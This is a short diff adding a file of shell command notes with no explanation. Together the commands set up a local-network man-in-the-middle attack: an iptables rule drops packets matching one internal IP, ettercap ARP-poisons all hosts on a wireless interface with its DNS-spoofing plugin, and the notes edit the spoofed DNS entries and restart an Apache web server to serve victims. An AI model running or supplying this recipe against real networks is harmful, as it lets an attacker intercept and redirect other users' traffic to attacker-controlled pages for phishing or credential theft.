@@ -1,0 +1,11 @@
+iptables --append FORWARD --match string --algo kmp --hex-string '|c0 a8 
+00 f1|' --jump DROP
+
+sudo ettercap -T -Q -i wlp8s0 -P dns_spoof -M arp // //
+
+sudo nano /etc/ettercap/etter.dns
+
+sudo systemctl restart httpd
+sudo nano /etc/httpd/conf/httpd.conf
+
+
